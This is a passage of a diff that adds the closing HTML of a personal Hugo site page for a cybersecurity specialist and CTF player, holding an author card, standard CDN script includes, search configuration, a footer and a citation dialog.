+  </ul>
+</div>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+
+
+
+
+
+  
+  
+  
+    
+  
+  
+  
+  <div class="media author-card content-widget-hr">
+    
+      
+      <img class="avatar mr-3 avatar-circle" src="/authors/kahla/avatar_huac9af2fd1f181695ca5d7a1e646fb7d2_9022537_270x270_fill_lanczos_center_2.png" alt="Belkahla Ahmed">
+    
+
+    <div class="media-body">
+      <h5 class="card-title"><a href="https://ahmed-belkahla.me/">Belkahla Ahmed</a></h5>
+      <h6 class="card-subtitle">Cyber Security Specialist @ Yogosha - CTF Player @ Zer0pts</h6>
+      <p class="card-text">Cyber Security Enthusiast from Tunisia, I enjoy playing in hacking and pentesting competitions,I skip classes to play CTF.</p>
+      <ul class="network-icon" aria-hidden="true">
+  
+    
+    
+    
+      
+    
+    
+    
+    
+    
+      
+    
+    <li>
+      <a href="/#contact" >
+        <i class="fas fa-envelope"></i>
+      </a>
+    </li>
+  
+    
+    
+    
+      
+    
+    
+    
+    
+    
+      
+    
+    <li>
+      <a href="https://twitter.com/BelkahlaAhmed1" target="_blank" rel="noopener">
+        <i class="fab fa-twitter"></i>
+      </a>
+    </li>
+  
+    
+    
+    
+      
+    
+    
+    
+    
+    
+      
+    
+    <li>
+      <a href="https://github.com/kahla-sec" target="_blank" rel="noopener">
+        <i class="fab fa-github"></i>
+      </a>
+    </li>
+  
+    
+    
+    
+    
+    
+    
+    
+      
+    
+    <li>
+      <a href="/files/cv.pdf" >
+        <i class="ai ai-cv"></i>
+      </a>
+    </li>
+  
+</ul>
+
+    </div>
+  </div>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+
+
+
+  </div>
+</article>
+
+      
+
+    
+    
+    
+      <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js" integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo=" crossorigin="anonymous"></script>
+      <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.imagesloaded/4.1.4/imagesloaded.pkgd.min.js" integrity="sha256-lqvxZrPLtfffUl2G/e7szqSvPBILGbwmsGE1MKlOi0Q=" crossorigin="anonymous"></script>
+      <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.isotope/3.0.6/isotope.pkgd.min.js" integrity="sha256-CBrpuqrMhXwcLLUd5tvQ4euBHCdh7wGlDfNz8vbu/iI=" crossorigin="anonymous"></script>
+      <script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.5.7/jquery.fancybox.min.js" integrity="sha256-yt2kYMy0w8AbtF89WXb2P1rfjcP/HTHLT7097U8Y5b8=" crossorigin="anonymous"></script>
+
+      
+
+      
+        
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.18.1/highlight.min.js" integrity="sha256-eOgo0OtLL4cdq7RdwRUiGKLX9XsIJ7nGhWEKbohmVAQ=" crossorigin="anonymous"></script>
+        
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.18.1/languages/r.min.js"></script>
+        
+      
+
+    
+
+    
+    
+      <script src="https://cdnjs.cloudflare.com/ajax/libs/leaflet/1.5.1/leaflet.js" integrity="sha256-EErZamuLefUnbMBQbsEqu1USa+btR2oIlCpBJbyD4/g=" crossorigin="anonymous"></script>
+    
+
+    
+    
+    <script>const code_highlighting = true;</script>
+    
+
+    
+    
+    <script>const isSiteThemeDark = true;</script>
+    
+
+    
+    
+    
+    
+    
+    
+    <script>
+      const search_config = {"indexURI":"/index.json","minLength":1,"threshold":0.3};
+      const i18n = {"no_results":"No results found","placeholder":"Search...","results":"results found"};
+      const content_type = {
+        'post': "Posts",
+        'project': "Projects",
+        'publication' : "Publications",
+        'talk' : "Talks"
+        };
+    </script>
+    
+
+    
+    
+
+    
+    
+    <script id="search-hit-fuse-template" type="text/x-template">
+      <div class="search-hit" id="summary-{{key}}">
+      <div class="search-hit-content">
+        <div class="search-hit-name">
+          <a href="{{relpermalink}}">{{title}}</a>
+          <div class="article-metadata search-hit-type">{{type}}</div>
+          <p class="search-hit-description">{{snippet}}</p>
+        </div>
+      </div>
+      </div>
+    </script>
+    
+
+    
+    
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/fuse.js/3.2.1/fuse.min.js" integrity="sha256-VzgmKYmhsGNNN4Ph1kMW+BjoYJM2jV5i4IlFoeZA9XI=" crossorigin="anonymous"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/mark.js/8.11.1/jquery.mark.min.js" integrity="sha256-4HLtjeVgH0eIB3aZ9mLYF6E8oU5chNdjU6p6rrXpl9U=" crossorigin="anonymous"></script>
+    
+
+    
+    
+
+    
+    
+
+    
+    
+    
+    
+    
+    
+    
+    
+    
+      
+    
+    
+    
+    
+    <script src="/js/academic.min.37431be2d92d7fb0160054761ab79602.js"></script>
+
+    
+
+
+
+
+
+
+  
+  
+  <div class="container">
+    <footer class="site-footer">
+  
+
+  <p class="powered-by">
+    © Ahmed Belkahla, 2021 &middot; 
+
+    Powered by the
+    <a href="https://sourcethemes.com/academic/" target="_blank" rel="noopener">Academic theme</a> for
+    <a href="https://gohugo.io" target="_blank" rel="noopener">Hugo</a>.
+
+    
+    <span class="float-right" aria-hidden="true">
+      <a href="#" class="back-to-top">
+        <span class="button_icon">
+          <i class="fas fa-chevron-up fa-2x"></i>
+        </span>
+      </a>
+    </span>
+    
+  </p>
+</footer>
+
+  </div>
+  
+
+  
+<div id="modal" class="modal fade" role="dialog">
+  <div class="modal-dialog">
+    <div class="modal-content">
+      <div class="modal-header">
+        <h5 class="modal-title">Cite</h5>
+        <button type="button" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body">
+        <pre><code class="tex hljs"></code></pre>
+      </div>
+      <div class="modal-footer">
+        <a class="btn btn-outline-primary my-1 js-copy-cite" href="#" target="_blank">
+          <i class="fas fa-copy"></i> Copy
+        </a>
+        <a class="btn btn-outline-primary my-1 js-download-cite" href="#" target="_blank">
+          <i class="fas fa-download"></i> Download
+        </a>
+        <div id="modal-error"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+</body>
+</html>
